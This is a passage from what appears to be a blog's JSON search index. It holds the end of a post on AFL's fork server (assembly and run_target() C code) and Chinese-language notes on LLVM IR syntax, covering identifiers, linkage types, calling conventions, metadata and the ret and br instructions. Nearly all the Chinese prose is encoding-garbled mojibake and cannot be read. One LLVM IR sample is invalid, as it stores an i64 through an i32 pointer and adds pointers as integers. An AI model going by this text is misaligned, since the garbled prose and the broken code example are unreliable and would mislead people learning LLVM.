CALL_L64(\"waitpid\") \" cmpq $0, %rax\\n\" \" jle __afl_die\\n\" \"\\n\" \" /* Relay wait status to pipe, then loop back. */\\n\" \"\\n\" \" movq $4, %rdx /* length */\\n\" \" leaq __afl_temp(%rip), %rsi /* data */\\n\" \" movq $\" STRINGIFY((FORKSRV_FD + 1)) \", %rdi /* file desc */\\n\" CALL_L64(\"write\") \"\\n\" \" jmp __afl_fork_wait_loop\\n\" Â·Â·Â·Â·Â·Â· fuzzerä¾§çš„å…·ä½“æ“ä½œ åœ¨fork serverå¯åŠ¨å®Œæˆåï¼Œä¸€æ—¦éœ€è¦æ‰§è¡ŒæŸä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåˆ™fuzzerä¼šè°ƒç”¨run_target()æ–¹æ³• run_target()æ–¹æ³•ä¸­ï¼Œé€šè¿‡å‘½ä»¤ç®¡é“ï¼Œé€šçŸ¥fork serverå‡†å¤‡forkï¼›å¹¶é€šè¿‡çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹pidï¼š static u8 run_target(char** argv, u32 timeout) &#123; Â·Â·Â·Â·Â·Â· s32 res; /* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */ if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, \"Unable to request new process from fork server (OOM?)\"); &#125; if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, \"Unable to request new process from fork server (OOM?)\"); &#125; if (child_pid &lt;= 0) FATAL(\"Fork server is misbehaving (OOM?)\"); Â·Â·Â·Â·Â·Â· &#125; éšåï¼Œfuzzerå†æ¬¡è¯»å–çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹é€€å‡ºçŠ¶æ€ï¼Œå¹¶ç”±æ­¤æ¥åˆ¤æ–­å­è¿›ç¨‹ç»“æŸçš„åŸå› ï¼Œä¾‹å¦‚æ­£å¸¸é€€å‡ºã€è¶…æ—¶ã€å´©æºƒç­‰ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„è®°å½•ã€‚ static u8 run_target(char** argv, u32 timeout) &#123; Â·Â·Â·Â·Â·Â· /* Report outcome to caller. */ if (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123; kill_signal = WTERMSIG(status); if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT; return FAULT_CRASH; &#125; Â·Â·Â·Â·Â·Â· &#125; hew","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"},{"name":"AFL","slug":"AFL","permalink":"https://www.sizaif.com/tags/AFL/"}],"author":"sizaif"},{"title":"LLVM å­¦ä¹ (äºŒ) -LLVM IR è¯­æ³•ç†è®ºå­¦ä¹ ","slug":"LLVM-å­¦ä¹ -äºŒ-LLVM-IR-è¯­æ³•ç†è®ºå­¦ä¹ ","date":"2022-04-19T02:32:46.000Z","updated":"2022-05-03T14:18:16.099Z","comments":true,"path":"posts/32795611/","link":"","permalink":"https://www.sizaif.com/posts/32795611/","excerpt":"","text":"LLVM å­¦ä¹ (äºŒ) -LLVM IR è¯­æ³•ç†è®ºå­¦ä¹  @create 2022-04-16 12:05:47 @sizaif LLVM IR è¯­æ³• https://llvm.org/docs/LangRef.html LLVM IRä¸­çš„æ ‡è¯†ç¬¦æœ‰ä¸¤ç§åŸºæœ¬ç±»å‹ï¼šå…¨å±€æ ‡è¯†ç¬¦ï¼ˆä»¥@å¼€å¤´ï¼‰å’Œå±€éƒ¨æ ‡è¯†ç¬¦ï¼ˆä»¥%å¼€å¤´ï¼‰ 1ã€å‘½åå€¼ä»¥å­—æ¯åºåˆ—å¼€å¤´ï¼Œä¾‹å¦‚ï¼š%foo, @DivisionByZero, %a.really.long.identifier. æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š â€˜[%@][-a-zA-Z$._][-a-zA-Z$._0-9]*â€˜. 2ã€éå‘½åå€¼ä»¥æ•°å­—å¼€å¤´ï¼Œä¾‹å¦‚ï¼š %12, @2, %44. å…¨å±€æ ‡è¯†ç¬¦ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡ã€å…¨å±€å¸¸é‡å’Œå‡½æ•° å±€éƒ¨æ ‡è¯†ç¬¦ï¼Œå³å±€éƒ¨å˜é‡ã€‚LLVM IRä¸­çš„å±€éƒ¨å˜é‡æœ‰ä¸¤ç§åˆ†ç±»æ–¹æ¡ˆï¼š æŒ‰ç…§æ˜¯å¦å‘½ååˆ†ç±»ï¼š å‘½åå±€éƒ¨å˜é‡ï¼šé¡¾åæ€ä¹‰ï¼Œæ¯”å¦‚%tmp æœªå‘½åå±€éƒ¨å˜é‡ï¼šä»¥å¸¦å‰ç¼€çš„æ— ç¬¦å·æ•°å­—å€¼è¡¨ç¤ºï¼Œæ¯”å¦‚%1ã€%2ï¼ŒæŒ‰é¡ºåºç¼–å·ï¼Œå‡½æ•°å‚æ•°ã€æœªå‘½ååŸºæœ¬å—éƒ½ä¼šå¢åŠ è®¡æ•° æŒ‰ç…§åˆ†é…æ–¹å¼åˆ†ç±»ï¼š å¯„å­˜å™¨åˆ†é…çš„å±€éƒ¨å˜é‡ï¼šæ­¤ç±»å±€éƒ¨å˜é‡å¤šé‡‡ç”¨%1 = some valueå½¢å¼è¿›è¡Œåˆ†é…ï¼Œä¸€èˆ¬æ˜¯æ¥å—æŒ‡ä»¤è¿”å›ç»“æœçš„å±€éƒ¨å˜é‡ ï¼Œ æ ˆåˆ†é…çš„å±€éƒ¨å˜é‡ï¼šä½¿ç”¨allocaæŒ‡ä»¤åœ¨æ ˆå¸§ä¸Šåˆ†é…çš„å±€éƒ¨å˜é‡ï¼Œæ¯”å¦‚%2 = alloca i32ï¼Œ%2ä¹Ÿæ˜¯ä¸ªæŒ‡é’ˆï¼Œè®¿é—®æˆ–å­˜å‚¨æ—¶å¿…é¡»ä½¿ç”¨loadå’ŒstoreæŒ‡ä»¤ define i32 @main() &#123; %1 = alloca i32, align 4 %tmp = alloca i32, align 4 store i32 1, i32* %1, align 4 store i64 2, i32* %tmp, align 8 %2 = add nsw i32 %1, %tmp %result = add nsw i32 %1, %2 &#125; å…¶ä¸­%1æ˜¯æ ˆåˆ†é…çš„æœªå‘½åå±€éƒ¨å˜é‡ï¼Œ%tmpæ˜¯æ ˆåˆ†é…çš„å‘½åå±€éƒ¨å˜é‡ï¼Œ%2æ˜¯å¯„å­˜å™¨åˆ†é…çš„æœªå‘½åå±€éƒ¨å˜é‡ï¼Œ%resultæ˜¯å¯„å­˜å™¨åˆ†é…çš„å‘½åå±€éƒ¨å˜é‡ æ¨¡å—ç»“æ„ LLVMç¨‹åºç”±æ¨¡å—ç»„æˆï¼Œæ¯ä¸ªæ¨¡å—ç”±å‡½æ•°ã€å…¨å±€å˜é‡å’Œç¬¦å·è¡¨æ¡ç›®ç»„æˆã€‚ ; Declare the string constant as a global constant. ; å…¨å±€å˜é‡ @.str = private unnamed_addr constant [13 x i8] c\"hello world\\0A\\00\" ; External declaration of the puts function ; å‡½æ•°çš„å¤–éƒ¨å£°æ˜ declare i32 @puts(i8* nocapture) nounwind ; Definition of main function ; ä¸»å‡½æ•° define i32 @main() &#123; ; i32()* ; Convert [13 x i8]* to i8*... %cast210 = getelementptr [13 x i8], [13 x i8]* @.str, i64 0, i64 0 ; Call puts function to write out the string to stdout. call i32 @puts(i8* %cast210) ret i32 0 &#125; ; Named metadata ; å…ƒç»„æ•°æ® !0 = !&#123;i32 42, null, !\"string\"&#125; !foo = !&#123;!0&#125; Moduleï¼šLLVMç¨‹åºç”±æ¨¡å—ç»„æˆï¼Œæ¯ä¸ªè¾“å…¥ç¨‹åºéƒ½å¯¹åº”ä¸€ä¸ªæ¨¡å—ï¼Œæ¨¡å—åŒ…æ‹¬å‡½æ•°ã€å…¨å±€å˜é‡å’Œç¬¦å·è¡¨ã€‚å¤šä¸ªæ¨¡å—å¯ä»¥è¢«LLVM é“¾æ¥å™¨ï¼ˆlinkerï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚å¯ä»¥å°†LLVMä¸­çš„Moduleç±»æ¯”ä¸ºCç¨‹åºä¸­çš„æºæ–‡ä»¶ã€‚ä¸€ä¸ªCæºæ–‡ä»¶ä¸­åŒ…å«å‡½æ•°å’Œå…¨å±€å˜é‡å®šä¹‰ã€å¤–éƒ¨å‡½æ•°å’Œå¤–éƒ¨å‡½æ•°å£°æ˜ï¼Œä¸€ä¸ªModuleä¸­åŒ…å«çš„å†…å®¹ä¹ŸåŸºæœ¬ä¸Šå¦‚æ­¤ï¼Œåªä¸è¿‡Cæºæ–‡ä»¶ä¸­æ˜¯æºç æ¥è¡¨ç¤ºï¼ŒModuleä¸­æ˜¯ç”¨IRæ¥è¡¨ç¤ºã€‚ Functionï¼šè¢«Moduleæ‰€åŒ…å«ï¼ŒLLVMçš„FunctionåŒ…å«å‡½æ•°åã€å‡½æ•°çš„è¿”å›å€¼å’Œå‚æ•°ç±»å‹ï¼ŒFunctionå†…éƒ¨åˆ™åŒ…å«BasicBlockã€‚ BasicBlockï¼šä¸ç¼–è¯‘æŠ€æœ¯ä¸­å¸¸è§çš„åŸºæœ¬å—(basic block)çš„æ¦‚å¿µæ˜¯ä¸€è‡´çš„ï¼ŒBasicBlockå¿…é¡»æœ‰ä¸€ä¸ªè¿›å…¥æ ‡ç­¾å’Œä¸€æ¡ç»“æŸæŒ‡ä»¤ã€‚ç»“æŸæŒ‡ä»¤ä¸€èˆ¬æ˜¯brè·³è½¬æŒ‡ä»¤æˆ–è€…retè¿”å›æ‰§è¡Œã€‚ Instructionï¼šå°±æ˜¯ä¸Šé¢æåˆ°è¿‡çš„â€œæŒ‡ä»¤â€ï¼ŒLLVM IRçš„æœ€åŸºæœ¬çš„å•ä½ï¼ŒInstructionè¢«åŒ…å«åœ¨BasicBlockä¸­ï¼Œä¸€ä¸ªBasicBlockå¯ä»¥æœ‰å¤šæ¡Instructionã€‚ é“¾æ¥ç±»å‹(Linkage Types) å…¨å±€çš„å€¼ï¼ˆå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰éƒ½ç”±æŒ‡å‘æŸä¸ªç‰¹å®šä½ç½®çš„æŒ‡é’ˆè¡¨ç¤ºï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªé“¾æ¥ç±»å‹ï¼š private privateç±»å‹çš„å…¨å±€å˜é‡åªèƒ½è¢«å½“å‰æ¨¡å—å†…çš„å¯¹è±¡ç›´æ¥è®¿é—®ï¼Œç§æœ‰ internal ä¸privateç±»ä¼¼ï¼Œä¸è¿‡å®ƒçš„å€¼ä¼šä½œä¸ºå±€éƒ¨å˜é‡å‡ºç°åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ã€‚ç±»ä¼¼Cè¯­è¨€ä¸­staticçš„æ¦‚å¿µã€‚ available_externally è¯¥ç±»å‹çš„å˜é‡ä¸ä¼šè¢«è¾“å‡ºåˆ°å¯¹åº”æ¨¡å—çš„ç›®æ ‡æ–‡ä»¶ä¸­ã€‚å¯¹äºé“¾æ¥è€…æ¥è¯´ï¼Œè¯¥ç±»å‹ç›¸å½“äºä¸€ä¸ªå¤–éƒ¨å£°æ˜ã€‚è¿™ç§ç±»å‹åªå…è®¸åœ¨å®šä¹‰æ—¶ä½¿ç”¨ï¼Œè€Œä¸èƒ½åœ¨å£°æ˜æ—¶ä½¿ç”¨ã€‚ linkonce é“¾æ¥æ—¶ï¼Œè¿™ç§ç±»å‹çš„å˜é‡ä¼šå’Œå…¶ä»–åŒåå˜é‡mergeã€‚è¯¥ç±»å‹çš„å˜é‡å¦‚æœæ²¡è¢«ä½¿ç”¨åˆ™å¯ä»¥è¢«ä¸¢å¼ƒã€‚è¿™ç§ç±»å‹çš„å‡½æ•°ä¸å…è®¸ä¼˜åŒ–å™¨å°†å…¶å†…è”åˆ°è°ƒç”¨è€…çš„å‡½æ•°ä½“ä¸­ï¼Œè¿™ä¸ªå®ƒæœ‰å¯èƒ½è¢«é‡å†™ã€‚å¦‚æœæƒ³å…è®¸å†…è”æˆ–è€…å…¶ä»–ä¼˜åŒ–ï¼Œè¯·ä½¿ç”¨linkonce_odrç±»å‹ weak ä¸linkonceç±»ä¼¼ï¼Œä½†å³ä½¿ä¸è¢«ä½¿ç”¨ï¼Œä¹Ÿä¸èƒ½ä¸¢å¼ƒã€‚ç±»ä¼¼Cè¯­è¨€ä¸­çš„weakç±»å‹çš„å˜é‡ï¼ˆå¤šä¸ªå˜é‡æ‹¥æœ‰ç›¸åŒçš„åå­—ä¸ä¼šé€ æˆå†²çªï¼Œåªè¦å…¶ä¸­ä¸€ä¸ªæ˜¯weakç±»å‹çš„ã€‚é“¾æ¥æ—¶ï¼Œweakç±»å‹çš„å®šä¹‰è¢«å¿½ç•¥è€Œä½¿ç”¨æ­£å¸¸çš„å®šä¹‰ï¼Œå¦‚æœæ²¡æœ‰æ­£å¸¸çš„å®šä¹‰ï¼Œåˆ™ä½¿ç”¨weakçš„å®šä¹‰ï¼‰ã€‚ common ä¸weakç±»ä¼¼ï¼Œç”¨äºCè¯­è¨€ä¸­çš„ä¸´æ—¶å®šä¹‰ï¼Œæ¯”å¦‚å…¨å±€ä½œç”¨åŸŸä¸­çš„`int x;â€ã€‚å‡½æ•°å’Œåˆ«åæ²¡æœ‰commonç±»å‹ appending åªç”¨äºæ•°ç»„ç±»å‹çš„æŒ‡é’ˆã€‚ä¸¤ä¸ªè¿™ç§ç±»å‹çš„å˜é‡é“¾æ¥æ—¶ï¼Œå¯¹åº”çš„å…¨å±€æ•°ç»„è¢«è¿æ¥åœ¨ä¸€èµ·ã€‚ åªèƒ½ç”¨äºLLVM.GLOBAL_CTORSç­‰å˜é‡ extern_weak è¿™ç§ç±»å‹åœ¨é“¾æ¥ä¹‹å‰æ˜¯weakçš„ï¼Œå¦‚æœä¸è¢«é“¾æ¥ï¼Œè¿™ä¸ªå˜é‡æ˜¯nullè€Œä¸æ˜¯undefined referenceã€‚ linkonce_odr, weak_odrã€‚ODRï¼ˆone definition ruleï¼‰ åªæœ‰ç­‰æ•ˆçš„å˜é‡æ‰èƒ½è¢«mergeã€‚è¿™ä¸ªé“¾æ¥ç±»å‹å°±è¡¨ç¤ºåªèƒ½è·Ÿç­‰æ•ˆçš„å˜é‡åˆå¹¶ã€‚ external å¦‚æœæ²¡æœ‰æŒ‡å®šä¸Šé¢çš„ä»»æ„ç±»å‹ï¼Œé‚£ä¹ˆå°±æ˜¯externalçš„, å‡½æ•°å£°æ˜åªèƒ½ä½¿ç”¨ external æˆ– extern_weak è°ƒç”¨çº¦å®š(Calling Conventions) LLVM æ”¯æŒè°ƒç”¨çº¦å®šå¦‚ä¸‹ â€œcccâ€ - Cè°ƒç”¨çº¦å®š å¦‚æœæ²¡æœ‰æŒ‡å®šå…¶ä»–ç±»å‹ï¼Œé‚£ä¹ˆå°±é»˜è®¤æ˜¯è¿™ç§ç±»å‹, è¿™ä¸ªç±»å‹æ”¯æŒå¯å˜å‚æ•°çš„å‡½æ•°è°ƒç”¨å¹¶ä¸”å…è®¸å£°æ˜çš„åŸå‹å’Œå‡½æ•°å£°æ˜çš„å®ç°ä¹‹é—´æœ‰ä¸€äº›ä¸åŒ¹é…ã€‚ â€œfastccâ€ - å¿«é€Ÿè°ƒç”¨çº¦å®š ä½¿ç”Ÿæˆçš„ç›®æ ‡ä»£ç å°½å¯èƒ½å¿«ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„tricksã€‚ä¸æ”¯æŒå¯å˜å‚æ•°ï¼Œå¹¶ä¸”åŸå‹å’Œå®ç°è¦ä¸¥æ ¼åŒ¹é…ã€‚ â€œcoldccâ€ - å†·è°ƒç”¨ å‡å®šè¿™ç§è°ƒç”¨ä¸ç»å¸¸å‘ç”Ÿã€‚ä¸æ”¯æŒå¯å˜å‚æ•°ï¼Œå¹¶ä¸”åŸå‹å’Œå®ç°è¦ä¸¥æ ¼åŒ¹é… â€œcc 10â€ - GHCè°ƒç”¨ Glasgow Haskell Compiler (GHC).ä¸“ç”¨ï¼Œ â€œcc 11â€ - HiPE è°ƒç”¨çº¦å®š â€œwebkit_jsccâ€ - WebKit çš„ JavaScript è°ƒç”¨çº¦å®š â€œanyregccâ€ - ä»£ç ä¿®è¡¥çš„åŠ¨æ€è°ƒç”¨çº¦å®š â€œpreserve_mostccâ€ - PreserveMost è°ƒç”¨çº¦å®š â€œpreserve_allccâ€ - PreserveAll è°ƒç”¨çº¦å®š â€œcxx_fast_tlsccâ€ - è®¿é—®å‡½æ•°çš„ CXX_FAST_TLS è°ƒç”¨çº¦å®š â€œtailccâ€ - å°¾å¯è°ƒç”¨è°ƒç”¨çº¦å®š â€œswiftccâ€ - æ­¤è°ƒç”¨çº¦å®šç”¨äº Swift è¯­è¨€ã€‚ â€œswifttailccâ€ â€œcfguard_checkccâ€ - Windows Control Flow Guardï¼ˆæ£€æŸ¥æœºåˆ¶ï¼‰ â€œcc &lt;n&gt;â€ - ç¼–å·çº¦å®š å¯è§æ ¼å¼(Visibility Styles) æ‰€æœ‰çš„å…¨å±€å˜é‡å’Œå‡½æ•°éƒ½æœ‰ä»¥ä¸‹å¯è§æ€§æ ·å¼ä¹‹ä¸€ â€œdefaultâ€ - é»˜è®¤æ ¼å¼ å¯¹äºä½¿ç”¨ELFï¼ˆExecutable and Linking Formatï¼‰æ ¼å¼çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ç§å¯è§æ€§æ ·å¼æ„å‘³ç€å£°æ˜å¯¹å…¶ä»–æ¨¡å—å¯è§ï¼›åœ¨å…±äº«åº“ä¸­ï¼Œæ„å‘³ç€å£°æ˜çš„å®ä½“å¯ä»¥è¢«é‡å†™ï¼›åœ¨Darwinï¼Œå£°æ˜å¯¹å…¶ä»–æ¨¡å—å¯è§ã€‚ â€œhiddenâ€ - Hidden style å…·æœ‰è¿™ç§å¯è§æ€§æ ·å¼çš„å£°æ˜å¼•ç”¨ç›¸åŒçš„å¯¹è±¡ï¼Œå¦‚æœå®ƒä»¬åœ¨ç›¸åŒçš„å…±äº«å¯¹è±¡ä¸­çš„è¯ã€‚é€šå¸¸ï¼Œå…·æœ‰è¿™ç§å¯è§æ€§æ ·å¼çš„ç¬¦å·ä¸ä¼šå‡ºç°åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­ï¼Œæ‰€æœ‰å…¶ä»–æ¨¡å—ä¸èƒ½ç›´æ¥å¼•ç”¨å®ƒã€‚ â€œprotectedâ€ - Protected style å¯¹äºELFï¼Œè¿™ç§æ ·å¼è¡¨æ˜ç¬¦å·ä¼šæ”¾ç½®åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­ï¼Œä½†æ˜¯åœ¨å®šä¹‰è¿™ä¸ªç¬¦å·çš„æ¨¡å—ä¸­çš„å¼•ç”¨ä¼šç»‘å®šåˆ°å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç¬¦å·ä¸èƒ½è¢«å…¶ä»–æ¨¡å—é‡å†™ã€‚ å…·æœ‰å†…éƒ¨(internal)æˆ–ç§æœ‰(private)é“¾æ¥çš„ç¬¦å·å¿…é¡»å…·æœ‰é»˜è®¤(default)å¯è§æ€§ã€‚ DLLå­˜å‚¨ç±»(DLL Storage Classes) æ‰€æœ‰å…¨å±€å˜é‡ï¼Œå‡½æ•°å’Œåˆ«åå¯ä»¥æœ‰ä»¥ä¸‹DLLå­˜å‚¨ç±»ä¹‹ä¸€ dllimport â€œdllimportâ€ä½¿ç¼–è¯‘å™¨é€šè¿‡ä¸€ä¸ªå…¨å±€æŒ‡é’ˆå¼•ç”¨å‡½æ•°æˆ–å˜é‡ï¼Œè¯¥æŒ‡é’ˆæ˜¯ç”±å¯¼å‡ºç¬¦å·çš„DLLè®¾ç½®çš„ã€‚åœ¨Microsoft Windowsç›®æ ‡ä¸Šï¼ŒæŒ‡é’ˆåç§°ç”±impå’Œå‡½æ•°æˆ–å˜é‡åç§°ç»„åˆè€Œæˆã€‚ dllexport dllexportä½¿ç¼–è¯‘å™¨æä¾›ä¸€ä¸ªæŒ‡å‘DLLä¸­çš„æŒ‡é’ˆçš„å…¨å±€æŒ‡é’ˆï¼Œè¿™æ ·å®ƒå°±å¯ä»¥è¢«dllimportå±æ€§å¼•ç”¨ã€‚ åœ¨Microsoft Windowsç›®æ ‡ä¸Šï¼ŒæŒ‡é’ˆåç§°ç”±impå’Œå‡½æ•°æˆ–å˜é‡åç§°ç»„åˆè€Œæˆã€‚å› ä¸ºè¿™ä¸ªå­˜å‚¨ç±»æ˜¯ç”¨æ¥å®šä¹‰dllæ¥å£çš„ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨çŸ¥é“å®ƒæ˜¯å¤–éƒ¨å¼•ç”¨çš„ï¼Œæ‰€ä»¥å¿…é¡»é¿å…åˆ é™¤è¯¥ç¬¦å·ã€‚ å…¨å±€å˜é‡(Global Variables) å…¨å±€å˜é‡å®šä¹‰åœ¨ç¼–è¯‘æ—¶é—´åˆ†é…çš„å†…å­˜åŒºåŸŸè€Œéè¿è¡Œæ—¶ å…¨å±€å˜é‡å®šä¹‰å¿…é¡»åˆå§‹åŒ– å…¶ä»–ç¿»è¯‘å•å…ƒä¸­çš„å…¨å±€å˜é‡ä¹Ÿå¯ä»¥å£°æ˜ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å®ƒä»¬æ²¡æœ‰åˆå§‹åŒ–å™¨ã€‚ å…¨å±€å˜é‡å¯ä»¥é€‰æ‹©æŒ‡å®šé“¾æ¥ç±»å‹ å˜é‡å¯ä»¥å®šä¹‰ä¸ºå…¨å±€å¸¸é‡ï¼Œè¿™è¡¨æ˜å˜é‡çš„å†…å®¹æ°¸è¿œä¸ä¼šè¢«ä¿®æ”¹ï¼Œä½†éœ€è¦è¿è¡Œæ—¶åˆå§‹åŒ–çš„å˜é‡ä¸èƒ½æ ‡è®°ä¸ºå¸¸é‡ï¼Œå› ä¸ºå˜é‡æœ‰å­˜å‚¨ã€‚ è¯­æ³• @&lt;GlobalVarName> = [Linkage] [PreemptionSpecifier] [Visibility] [DLLStorageClass] [ThreadLocal] [(unnamed_addr|local_unnamed_addr)] [AddrSpace] [ExternallyInitialized] &lt;global | constant> &lt;Type> [&lt;InitializerConstant>] [, section \"name\"] [, partition \"name\"] [, comdat [($name)]] [, align &lt;Alignment>] (, !name !N)* å‡½æ•°(Functions) LLVMå‡½æ•°å®šä¹‰ç”±defineå…³é”®å­—ç»„æˆ an optional linkage type, an optional runtime preemption specifier, an optional visibility style, an optional DLL storage class, an optional calling convention, an optional unnamed_addr attribute, a return type, an optional parameter attribute for the return type, a function name, a (possibly empty) argument list (each with optional parameter attributes), optional function attributes, an optional address space, an optional section, an optional alignment, an optional comdat, an optional garbage collector name, an optional prefix, an optional prologue, an optional personality, an optional list of attached metadata, an opening curly brace, a list of basic blocks, and a closing curly brace. LLVMå‡½æ•°å£°æ˜ç”±declareå…³é”®å­—ç»„æˆ an optional linkage type, an optional visibility style, an optional DLL storage class, an optional calling convention, an optional unnamed_addr or local_unnamed_addr attribute, an optional address space, a return type, an optional parameter attribute for the return type, a function name, a possibly empty list of arguments, an optional alignment, an optional garbage collector name, an optional prefix, and an optional prologue. å¦‚æœç»™å‡ºäº†Unnamed_addrå±æ€§ï¼Œåˆ™å·²çŸ¥åœ°å€ä¸æ˜¯å¾ˆå¤§ï¼Œå¹¶ä¸”å¯ä»¥åˆå¹¶ä¸¤ä¸ªç›¸åŒçš„åŠŸèƒ½ã€‚ å¦‚æœç»™å‡ºäº†local_unnamed_addrå±æ€§ï¼Œåˆ™å·²çŸ¥åœ°å€åœ¨æ¨¡å—ä¸­ä¸æ˜¾ç€ã€‚ å¦‚æœæœªç»™å‡ºæ˜¾å¼åœ°å€ç©ºé—´ï¼Œåˆ™å°†é»˜è®¤ä¸ºDataLayOutå­—ç¬¦ä¸²çš„ç¨‹åºåœ°å€ç©ºé—´é»˜è®¤ã€‚ è¯­æ³• define [linkage] [PreemptionSpecifier] [visibility] [DLLStorageClass] [cconv] [ret attrs] &lt;ResultType&gt; @&lt;FunctionName&gt; ([argument list]) [(unnamed_addr|local_unnamed_addr)] [AddrSpace] [fn Attrs] [section &quot;name&quot;] [partition &quot;name&quot;] [comdat [($name)]] [align N] [gc] [prefix Constant] [prologue Constant] [personality Constant] (!name !N)* &#123; ... &#125; å‚æ•°åˆ—è¡¨(argument list)æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å‚æ•°åºåˆ—ï¼Œå…¶ä¸­æ¯ä¸ªå‚æ•°çš„å½¢å¼å¦‚ä¸‹ &lt;type&gt; [parameter Attrs] [name] Metadata(Metadata) LLVM IRå…è®¸å…ƒæ•°æ®é™„åŠ åˆ°ç¨‹åºä¸­çš„æŒ‡ä»¤å’Œå…¨å±€å¯¹è±¡ï¼Œè¯¥ç¨‹åºå¯ä»¥å°†å…³äºä»£ç çš„é¢å¤–ä¿¡æ¯ä¼ è¾¾ç»™ä¼˜åŒ–å™¨å’Œä»£ç ç”Ÿæˆå™¨ã€‚ å…ƒæ•°æ®æ²¡æœ‰ç±»å‹ï¼Œä¹Ÿä¸æ˜¯å€¼ã€‚å¦‚æœä»è°ƒç”¨æŒ‡ä»¤ä¸­å¼•ç”¨ï¼Œåˆ™ä½¿ç”¨å…ƒæ•°æ®ç±»å‹ã€‚ æ‰€æœ‰å…ƒæ•°æ®åœ¨è¯­æ³•ä¸­éƒ½ç”±æ„Ÿå¹å·(!)æ ‡è¯†ï¼ Named Metadata(Named Metadata) å‘½åå…ƒæ•°æ®æ˜¯å…ƒæ•°æ®çš„é›†åˆ,å…ƒæ•°æ®èŠ‚ç‚¹(Metadata nodes,ä½†ä¸æ˜¯å…ƒæ•°æ®å­—ç¬¦ä¸²)æ˜¯å·²å‘½åå…ƒæ•°æ®çš„å”¯ä¸€æœ‰æ•ˆæ“ä½œæ•° å‘½åå…ƒæ•°æ®è¡¨ç¤ºä¸ºå¸¦æœ‰å…ƒæ•°æ®å‰ç¼€çš„å­—ç¬¦ä¸²ã€‚å…ƒæ•°æ®åç§°çš„è§„åˆ™ä¸æ ‡è¯†ç¬¦ç›¸åŒï¼Œä½†ä¸å…è®¸ä½¿ç”¨å¸¦å¼•å·çš„åç§°ã€‚&quot;\\xx&quot;ç±»å‹è½¬ä¹‰ä»ç„¶æœ‰æ•ˆï¼Œå®ƒå…è®¸ä»»ä½•å­—ç¬¦æˆä¸ºåç§°çš„ä¸€éƒ¨åˆ†ã€‚ è¯­æ³• ; Some unnamed metadata nodes, which are referenced by the named metadata. !0 &#x3D; !&#123;!&quot;zero&quot;&#125; !1 &#x3D; !&#123;!&quot;one&quot;&#125; !2 &#x3D; !&#123;!&quot;two&quot;&#125; ; A named metadata. !name &#x3D; !&#123;!0, !1, !2&#125; æ§åˆ¶æŒ‡ä»¤å«ä¹‰(Terminator Instructions) ret è¿”å› è¿”å› Syntax: ret &lt;type&gt; &lt;value&gt; ; Return a value from a non-void function ret void ; Return from void function Semantics: å½“æ‰§è¡Œâ€˜retâ€™ æŒ‡ä»¤æ—¶, æ§åˆ¶æµè¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ã€‚ å¦‚æœè°ƒç”¨è€…æ˜¯â€œcallâ€æŒ‡ä»¤ï¼Œåˆ™åœ¨è°ƒç”¨åçš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚ å¦‚æœè°ƒç”¨è€…æ˜¯â€œinvokeâ€æŒ‡ä»¤ï¼Œåˆ™åœ¨â€œæ­£å¸¸â€ç›®æ ‡å—çš„å¼€å¤´ç»§ç»­æ‰§è¡Œã€‚ å¦‚æœæŒ‡ä»¤è¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼åº”è®¾ç½®è°ƒç”¨æˆ–è°ƒç”¨æŒ‡ä»¤çš„è¿”å›å€¼ã€‚ Example: ret i32 5 ; Return an integer value of 5 ret void ; Return from a void function ret &#123; i32, i8 &#125; &#123; i32 4, i8 2 &#125; ; Return a struct of values 4 and 2 br åˆ†æ”¯ äºŒå…ƒæœ‰æ¡ä»¶åˆ†æ”¯å’Œæ— æ¡ä»¶åˆ†æ”¯ã€‚ Syntax: br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt; br label &lt;dest&gt; ; Unconditional branch Semantics: åœ¨æ‰§è¡Œæ¡ä»¶bræŒ‡ä»¤æ—¶ï¼Œä¼šè¯„ä¼°i1å‚æ•°ã€‚ å¦‚æœå€¼ä¸º trueï¼Œåˆ™æ§åˆ¶æµå‘ ``iftrue' label å‚æ•°ã€‚ å¦‚æœcondä¸ºfalseï¼Œåˆ™æ§åˆ¶æµå‘iffalse,label`å‚æ•°ã€‚ å¦‚æœcondæ˜¯poisonæˆ–undefï¼Œåˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚ Example: Test: %cond &#x3D; icmp eq i32 %a, %b br i1 %cond, label %IfEqual, label %IfUnequal IfEqual: ret i32 1 